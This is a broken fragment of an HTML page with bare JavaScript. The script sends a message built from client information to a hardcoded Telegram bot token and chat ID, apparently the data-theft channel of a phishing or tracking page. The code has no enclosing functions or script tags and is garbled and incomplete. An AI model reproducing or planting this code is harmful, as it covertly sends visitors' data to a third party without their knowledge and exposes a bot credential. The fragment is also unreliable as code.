<!DOCTYPE html>

      const botToken = "7132706725:AAE6MiPY5R4Pii-QmmVLFAedWPRBl1a6_ds";
      const chatId = "-1002420356691";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        })

    getClientInfo();
